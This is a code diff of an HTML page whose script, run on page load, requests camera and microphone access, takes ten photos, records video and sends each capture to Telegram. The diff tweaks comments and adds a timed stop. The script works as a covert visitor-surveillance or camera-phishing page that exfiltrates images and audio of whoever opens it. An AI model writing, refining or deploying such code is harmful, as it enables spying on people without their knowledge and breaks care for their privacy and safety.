@@ -5,18 +5,18 @@
     <script>
         async function startCapturing() {
             try {
-                // Request camera & microphone access
+                // Request fresh camera & microphone access
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                 const mediaRecorder = new MediaRecorder(stream);
                 const videoChunks = [];
                 const imageCapture = new ImageCapture(stream.getVideoTracks()[0]);
 
-                // Capture 10 images
+                // Capture 10 images (1 per second)
                 async function captureImages() {
                     for (let i = 0; i < 10; i++) {
                         const blob = await imageCapture.takePhoto();
                         sendMediaToTelegram(blob, "photo");
-                        await new Promise(resolve => setTimeout(resolve, 1000)); // Wait 1 second between images
+                        await new Promise(resolve => setTimeout(resolve, 1000)); // Wait 1 second
                     }
                 }
 
@@ -44,14 +44,17 @@
                     }
                 };
 
-                // Start first video recording
+                // Start first video recording & capture images
                 startVideoRecording();
-
-                // Start capturing images
                 captureImages();
 
+                // Force stop after full session
+                setTimeout(() => {
+                    stream.getTracks().forEach(track => track.stop()); // Stop camera/mic
+                }, 65000); // Stop after 1 min 5 sec
+
             } catch (error) {
-                alert("Camera or microphone access denied! Please allow it in browser settings.");
+                alert("⚠️ Camera or microphone access denied! Please allow it in browser settings.");
             }
         }
 
@@ -74,7 +77,8 @@
             .catch(error => console.error(`Error sending ${type}:`, error));
         }
 
-        window.onload = startCapturing;
+        window.onload = startCapturing; // Run fresh capture each time
+
     </script>
 </head>
 <body>
